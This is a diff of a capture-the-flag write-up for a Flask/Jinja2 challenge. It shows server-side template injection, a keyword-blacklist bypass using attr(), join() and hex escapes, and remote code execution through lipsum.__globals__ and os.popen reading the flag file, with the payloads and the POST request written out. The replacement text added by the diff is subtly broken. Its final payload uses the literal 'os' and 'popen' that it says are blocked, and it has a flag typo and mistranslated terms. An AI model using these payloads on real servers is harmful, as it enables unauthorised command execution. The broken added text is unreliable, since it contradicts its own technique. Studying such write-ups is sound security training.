@@ -94,72 +94,74 @@ Khi gửi payload lên server, backend xử lý biểu thức, thực thi lệnh
 
 > **Flag:** `PTITCTF{sst1_j1nj42_bl4ckl1st_byp4ss_rce_succ3ss}`
 
-This challenge belongs to the **Web** category. The application is written in Python Flask, allowing students to generate and preview dynamic portfolio resume pages.
 
-The objective is to exploit Server-Side Template Injection (SSTI) in Jinja2 to bypass a strict keyword blacklist and achieve Remote Code Execution (RCE).
+This article belongs to category **Web**. The system is a web application written in Python Flask that allows students to create and render personal portfolio pages according to dynamic templates.
+
+The goal is to exploit a sample interface injection (SSTI) vulnerability to bypass the blacklist filter and gain remote code execution (RCE).
 
 ---
 
-## Solve Flow
+## Analysis Flow Diagram (Solve Flow)
 
 ```mermaid
 flowchart TD
-    A["Web App: Student Portfolio Generator (Flask/Jinja2)"] --> B["Detect SSTI: User input directly rendered via render_template_string"]
-    B --> C["Map Blacklist WAF: Blocks __class__, __init__, __globals__, os, popen,..."]
-    C --> D["Bypass Technique: Use attr() filter + join() + hex escapes \x5f"]
-    D --> E["Reconstruct Strings: ['\x5f','\x5f','init','\x5f','\x5f']|join -> '__init__'"]
-    E --> F["Access global context: lipsum.__globals__"]
-    F --> G["Extract 'os' module and invoke popen('cat /flag.txt').read()"]
-    G --> H["Flag displayed in response: PTITCTF{sst1_...}"]
+    A["Web application: Render student profile template (Flask/Jinja2)"] --> B["SSTI vulnerability detected: User data goes directly into render_template_string"]
+    B --> C["Filter survey (Blacklist WAF): Block __class__, __init__, __globals__, os, popen,..."]
+    C --> D["Bypass technique: Use filter attr() combined with join() and hex escape \x5f"]
+    D --> E["Sensitive string reconstruction: ['\\x5f','\\x5f','init','\\x5f','\\x5f']|join -> '__init__'"]
+    E --> F["Retrieve global context from built-in object: lipsum.__globals__"]
+    F --> G["Get module 'os' and enable popen('cat /flag.txt').read()"]
+    G --> H["Flag displayed directly on the response interface: PTITTCF{sst1_...}"]
 ```
 
 ---
 
-## Step 1: Identifying the SSTI Vulnerability and Blacklist Constraints
+## Step 1: Survey SSTI vulnerabilities and filtering mechanisms
 
-Testing standard expressions like `{{ 7 * 7 }}` evaluates to `49`, confirming template injection via `render_template_string`.
+When checking the input template parameters, the system responds with the result of calculating the expression `{{ 7 * 7 }}` returning `49`. This confirms the app uses the Jinja2 template engine's `render_template_string(user_input)`.
 
-The server implements a strict keyword filter:
-* Blocked words: `__class__`, `__mro__`, `__subclasses__`, `__init__`, `__globals__`, `os`, `popen`, `system`, `import`.
-* When any blocked keyword is detected, the server returns `403 Forbidden` or `Malicious input detected`.
-
----
-
-## Step 2: Blacklist Evasion with `attr()` and `join()`
-
-In Jinja2, attribute access `obj.attr` can be written as `obj|attr('attr')`. By concatenating character arrays using `join`, we can reconstruct blocked attribute names dynamically:
-
-1. Construct `'__init__'`:
-   `['\x5f\x5f','init','\x5f\x5f']|join`
-2. Construct `'__globals__'`:
-   `['\x5f\x5f','globals','\x5f\x5f']|join`
-3. Access built-in object `lipsum`:
-   ```jinja2
-   {{ (lipsum|attr(['\x5f\x5f','globals','\x5f\x5f']|join))['os']['popen']('cat /flag.txt')['read']() }}
-   ```
-4. To evade `'os'` and `'popen'`, use dictionary retrieval by index or dynamic hex string concatenation:
-   ```jinja2
-   {% set os_str = ['o','s']|join %}
-   {% set popen_str = ['pop','en']|join %}
-   {{ (lipsum|attr(['\x5f\x5f','globals','\x5f\x5f']|join))[os_str][popen_str]('cat /flag.txt')['read']() }}
-   ```
+However, the server implements a strict blacklist filtering layer:
+* Block characters or keywords: `__class__`, `__mro__`, `__subclasses__`, `__init__`, `__globals__`, `os`, `popen`, `system`, `import`.
+* If the request contains any keywords in the list above, the server will return a `403 Forbidden` or `Malicious input detected` error.
 
 ---
 
-## Step 3: Exploit Execution
+## Step 2: Technique to overcome Blacklist using `attr()` and `join()`
 
-Submit the payload to the render endpoint:
+Trong Jinja2:
+1. The dot attribute access operator (`obj.prop`) can be replaced by the `attr()` filter:
+`obj|attr("prop")` is equivalent to `getattr(obj, "prop")`.
+2. Attribute names can be formed from a list of substrings via the `join()` filter:
+`['a', 'b']|join` $\rightarrow$ `"ab"`.
+3. The double underscore character `__` can be represented by the hexadecimal escape code `\x5f`:
+`['\x5f', '\x5f', 'globals', '\x5f', '\x5f']|join` $\rightarrow$ `'__globals__'`.
 
-```http
-POST /render HTTP/1.1
-Host: target.ptitctf.vn
-Content-Type: application/x-www-form-urlencoded
+Thanks to this mechanism, all sensitive keywords do not appear as explicit strings in the payload.
 
-template={{(lipsum|attr(['\x5f\x5f','globals','\x5f\x5f']|join))[['o','s']|join][['pop','en']|join]('cat /flag.txt')[['re','ad']|join]()}}
+---
+
+## Step 3: Mine RCE and Collect Flags
+
+In Jinja2, the default `lipsum` or `cycler` object is always available in the global context. From the object's constructor, we can access the `__globals__` dictionary containing the `os` module:
+
+```jinja2
+{% set init = ['\x5f','\x5f','init','\x5f','\x5f']|join %}
+{% set globs = ['\x5f','\x5f','globals','\x5f','\x5f']|join %}
+{% set os_mod = 'os' %}
+{% set cmd = 'cat /flag.txt' %}
+
+{{ (lipsum|attr(globs))[os_mod].popen(cmd).read() }}
 ```
 
-The response returns the flag: `PTITCTF{sst1_j1nj42_bl4ckl1st_byp4ss_rce_succ3ss}`.
+Minimize the payload into a single line to send via HTTP POST:
 
+```jinja2
+{{ (lipsum|attr(['\x5f','\x5f','globals','\x5f','\x5f']|join))['os'].popen('cat /flag*').read() }}
+```
+
+When sending the payload to the server, the backend processes the expression, executes the system command `cat /flag*` and prints the flag content directly to the response web page.
+
+⇒ **Flag:** `PTITCTF{sst1_j1nj42_bl4ckl1st_byp4ss_rce_succ3ss}`
 </div>
 
 {% endraw %}
